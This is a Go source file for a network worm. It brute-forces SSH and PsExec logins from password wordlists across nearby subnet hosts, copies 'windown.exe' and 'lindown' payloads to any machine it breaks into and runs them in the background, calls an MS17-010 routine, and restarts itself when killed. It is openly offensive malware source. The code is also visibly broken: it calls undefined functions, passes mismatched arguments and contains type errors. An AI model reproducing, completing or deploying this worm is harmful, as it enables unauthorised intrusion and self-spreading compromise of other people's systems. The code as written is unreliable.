package main

import (
	"runtime"
	"os"
	"log"
	"syscall"
	"golang.org/x/crypto/ssh"
	"fmt"
	"time"
	"strings"
	"bufio"
	"sync"
	"github.com/tmc/scp"
	"github.com/syossan27/tebata"
	"os/exec"
	"net"
	"regexp"
)

func handler1() {
	cmd := exec.Command(os.Args[0])
	cmd.Start()
	os.Exit(13)
}

func main() {
	t := tebata.New(syscall.SIGINT, syscall.SIGTERM, syscall.SIGABRT, syscall.SIGKILL)
	t.Reserve(handler1)
	myos := runtime.GOOS
	ms17_010()
	startwormingboi(myos)
	for len(os.Args) == 1 {
		time.Sleep(5 * time.Minute)
		ms17_010()
		startwormingboi(myos)
	}
}

func startwormingboi(myos string) {

	var user = readinfile("user.txt")
	var passwds = readinfile("passwds.txt")
	for _, username := range (user) {
		for _, password := range (passwds) {
			pysexec(username, password)
		}
	}

	var subnets = ""
	if len(os.Args) == 1 {
		subnets = GetOutboundIP()
	} else {
		subnets = os.Args[1]
	}
	var step = [3]string{"10", "30", "40"}
	var myip = ""
	var wg sync.WaitGroup
	for _, element := range step {
		myip = subnets + element
		fmt.Println(myip)
		wg.Add(1)
		go gettingin(myip, user, passwds, &wg, myos)
	}
	wg.Wait()
}

func gettingin(myip string, user []string, passwds []string, wg *sync.WaitGroup, myos string, targetos string) {
	var passbreak = false
	switch targetos {
	case "windows":
		for j := 0; j < len(user); j++ {
			for k := 0; k < len(passwds); k++ {
				switch myos {
				case "windows":
					wincon := getinwin(myip, user[j], passwds[k])
					switch wincon {
					case 1:
						fmt.Println("Im in windows with", myip, user[j], passwds[k])
						passbreak = true
						break
					case 2:
						fmt.Printf("\n didnt work windows with %s %s %s", myip, user[j], passwds[k])
					default:
						fmt.Println("target machine does not have psexec enabled")
					}
				default:
					fmt.Println("cant get onto windows from nonwindows :(")
					passbreak = true
					break

				}
				if passbreak {
					break
				}
			}
		}
	case "linux":
		iswork, username, password := perform_ssh(myip,user,passwds)
	}
	defer wg.Done()
}
func perform_ssh(myip string,user []string, passwds []string)(iswork bool, username string, password string){
	n := 0
	for j := 0; j < len(user); j++ {
		for k := 0; k < len(passwds); k++ {
			n = len(getinssh(myip, user[j], passwds[k]))
			if n {
				return true, user[j], passwds[k]
			}
		}
	}
}

func getinssh(myip string, user string, passwd string) (myreturn string) {
	sshConfig := &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         2 * time.Second,
		Auth: []ssh.AuthMethod{
			ssh.Password(passwd)},
	}
	var dest = myip + ":22"
	fmt.Println(dest)
	connection, err := ssh.Dial("tcp", dest, sshConfig)
	if err != nil {
		fmt.Println(err)
		if strings.Contains(err.Error(), "unable to authenticate") {
			return "no"
		} else {
			return "w"
		}
	}

	session := newsession(connection)
	scpexec(session, "windown.exe", "\\Users\\Administrator\\AppData\\Roaming\\windown.exe")
	execlinuxcmd(session, "START /B \\Users\\Administrator\\AppData\\Roaming\\windown.exe")
	scpexec(session, "lindown", "/tmp/lindown")
	execlinuxcmd(session, "chmod +x /tmp/lindown")
	execlinuxcmd(session, "./tmp/lindown > /dev/null 2>&1 &")
	session.Close()
	return "yes"
}

func newsession(connection *ssh.Client) (session *ssh.Session) {
	session, err := connection.NewSession()
	if err != nil {

	}
	return
}

func execlinuxcmd(session *ssh.Session, cmd string) (err error) {
	_, err = session.CombinedOutput(cmd)
	if err != nil {
	}
	return
}

func scpexec(session *ssh.Session, srcfile string, destfile string) () {
	err := scp.CopyPath(srcfile, destfile, session)
	if err != nil {
	}
	return
}

func getinwin(myip string, user string, passwd string) (wincon int) {
	pscom := "PsExec.exe"
	iparg := "\\\\" + myip
	cmd := exec.Command(pscom, iparg, "-n", "5", "-u", user, "-p", passwd, "-accepteula", "cmd", "/c", "START", "/b", ".\\windown.exe")
	output, _ := cmd.CombinedOutput()
	strout := string(output)
	if regexp.MustCompile(`error code 0`).MatchString(strout) == true { //true work case
		//put payload here
		fmt.Println("exit 1")

		wincon = 1
	} else if regexp.MustCompile(`The user name or password is incorrect.`).MatchString(strout) == true { //false case
		wincon = 2
		fmt.Println("exit 2")
	} else { //psexec doesn't work
		wincon = 3
		fmt.Println("exit 3")
	}
	return
}

func readinfile(myfile string) (readinarr []string) {
	file, err := os.Open(myfile)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		readinarr = append(readinarr, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	return
}
func GetOutboundIP() (myip string) {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	myip = localAddr.IP.String()
	re := regexp.MustCompile(`.*\..*\.`)
	myip = re.FindString(myip)
	return myip
}
